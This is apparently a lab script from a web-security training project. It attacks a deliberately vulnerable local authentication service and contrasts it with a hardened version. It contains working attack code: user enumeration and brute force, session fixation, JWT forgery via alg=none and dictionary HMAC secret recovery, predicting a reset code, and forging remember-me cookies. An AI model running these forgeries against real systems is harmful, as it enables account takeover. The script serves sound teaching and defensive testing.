#!/usr/bin/env bash
# Checklist section 1 — authentication, sessions, tokens.  Target: m01-authentication (8081)
# Everything below runs against 127.0.0.1 only; see attacks/lib.sh.
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib.sh"
PORT=8081
banner "01 · authentication, sessions and tokens (port ${PORT})"
up "${PORT}" m01-authentication

# -----------------------------------------------------------------------------------------------
title "1. Unsalted MD5 password hashes, readable without authentication"
note "A dump of this map is a full credential leak: MD5 is unsalted and fast."
req GET "${PORT}" "/vuln1/debug/users"

# -----------------------------------------------------------------------------------------------
title "2. Brute force and user enumeration (no throttling, distinct error messages)"
for candidate in admin root alice bob; do
  printf '  try user=%-6s -> ' "${candidate}"
  post_body_of "${PORT}" "/vuln1/login" "{\"username\":\"${candidate}\",\"password\":\"wrong-password\"}" \
    | tr -d '\n'
  echo
done
note "The response says 'unknown user' vs 'wrong password': account existence is public."
note "40 attempts per second against an unthrottled endpoint is a normal evening for a botnet."

# -----------------------------------------------------------------------------------------------
title "3. Session fixation: the pre-auth session id survives login"
PRE=$(body_of "${PORT}" "/vuln1/session-id" | tr -cd 'A-Za-z0-9=' | sed 's/.*session//')
note "session id offered before authentication: ${PRE:0:24}…"
LOGIN=$(curl -sS -m 8 -X POST -H 'Content-Type: application/json' \
  -b "VULN1SESSION=${PRE}" --data '{"username":"alice","password":"***"}' \
  "$(BASE_FOR_PORT ${PORT})/vuln1/login")
echo "  login response: ${LOGIN}"
note "The same id is now an authenticated session; an attacker who planted it reads the account."
req_with_headers POST "${PORT}" "/vuln1/login" -H 'Content-Type: application/json' \
  --data '{"username":"alice","password":"***"}'
note "Compare with /safe1/login: 'sessionRotatedFrom' proves the id changes on authentication."

# -----------------------------------------------------------------------------------------------
title "4. Cookie flags: no HttpOnly, no Secure"
req_with_headers POST "${PORT}" "/vuln1/set-cookie-demo"

# -----------------------------------------------------------------------------------------------
title "5. JWT: obtain a legitimately signed token (weak secret in application.yml)"
ISSUED=$(post_body_of "${PORT}" "/vuln1/token/issue" '{"sub":"alice","role":"USER"}')
echo "  issued: ${ISSUED}"
USER_TOKEN=$(echo "${ISSUED}" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
echo "  token: ${USER_TOKEN:0:48}…"

# -----------------------------------------------------------------------------------------------
title "6a. Forgery without any secret at all: alg=none is accepted"
FORGED_NONE=$(python3 - "$(BASE_FOR_PORT ${PORT})" <<'PY'
import base64, json, sys
b64 = lambda o: base64.urlsafe_b64encode(json.dumps(o, separators=(",", ":")).encode()).rstrip(b"=").decode()
header = {"alg": "none", "typ": "JWT"}
claims = {"sub": "attacker", "role": "ADMIN"}
print(f"{b64(header)}.{b64(claims)}.")
PY
)
note "forged (alg=none): ${FORGED_NONE:0:48}…"
req GET "${PORT}" "/vuln1/admin/espd-summary" "" application/json -H "Authorization: Bearer ${FORGED_NONE}"

# -----------------------------------------------------------------------------------------------
title "6b. Forgery by recovering the signing key: dictionary HMAC secret"
FORGED_BRUTE=$(python3 - "$(BASE_FOR_PORT ${PORT})" <<'PY'
import base64, hashlib, hmac, json, sys, urllib.request

base = sys.argv[1]
words = ["secret", "password", "123456", "changeme", "s3cr3t", "key", "test", "espd", "admin"]

def b64(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
claims = b64(json.dumps({"sub": "attacker", "role": "ADMIN"}, separators=(",", ":")).encode())
signing_input = f"{header}.{claims}".encode()

recovered = None
for word in words:
    digest = hmac.new(word.encode(), signing_input, hashlib.sha256).digest()
    token = f"{header}.{claims}.{b64(digest)}"
    request = urllib.request.Request(
        f"{base}/vuln1/token/verify",
        data=json.dumps({"token": token}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST")
    try:
        with urllib.request.urlopen(request, timeout=8) as response:
            if response.status == 200:
                recovered = (word, token)
                break
    except Exception:
        pass

if not recovered:
    print("")
else:
    print(recovered[1])
    print(f"# recovered secret: {recovered[0]!r}", file=sys.stderr)
PY
)
if [ -n "${FORGED_BRUTE}" ]; then
  note "a token minted with a dictionary secret was accepted"
  req GET "${PORT}" "/vuln1/admin/espd-summary" "" application/json -H "Authorization: Bearer ${FORGED_BRUTE}"
fi

# -----------------------------------------------------------------------------------------------
title "7. Predictable password-reset code (java.util.Random seeded by the minute)"
SENT=$(post_body_of "${PORT}" "/vuln1/password-reset" '{"username":"alice"}' | sed -n 's/.*"delivered":"\([0-9]*\)".*/\1/p')
PREDICTED=$(curl -sS -m 8 "$(BASE_FOR_PORT ${PORT})/vuln1/token/predict?seed=$(( $(date +%s) / 60 ))" | sed -n 's/.*"predictedToken":"\([^"]*\)".*/\1/p')
echo "  code the service 'sent'   : ${SENT}"
echo "  derived from time-seed    : ${PREDICTED}"
note "Both come from a generator seeded with the current minute: the code is computable, not secret."
note "/safe1 uses SecureRandom, stores only a digest, expires in 5 minutes and is single-use."

# -----------------------------------------------------------------------------------------------
title "8. Remember-me cookie minted offline (static key compiled into the artifact)"
FORGED_REMEMBER="mallory:$(body_of "${PORT}" "/vuln1/remember-me/mallory" | sed -n 's/.*"rememberMe":"mallory:\([^"]*\)".*/\1/p')"
note "value taken from the reference endpoint; the same value is computable from the sources alone"
req POST "${PORT}" "/vuln1/remember-me/login" "" application/json -H "X-Remember-Me: ${FORGED_REMEMBER}"

# -----------------------------------------------------------------------------------------------
title "9. Same operations against /safe1 (expected: rejected or rotated)"
req POST "${PORT}" "/safe1/login" '{"username":"alice","password":"***"}'
req GET  "${PORT}" "/safe1/admin/espd-summary" "" application/json -H "Authorization: Bearer ${FORGED_NONE}"
req POST "${PORT}" "/safe1/token/verify" "{\"token\":\"${FORGED_NONE}\"}"
echo
banner "done · details and fixes: docs/01-authentication.md"
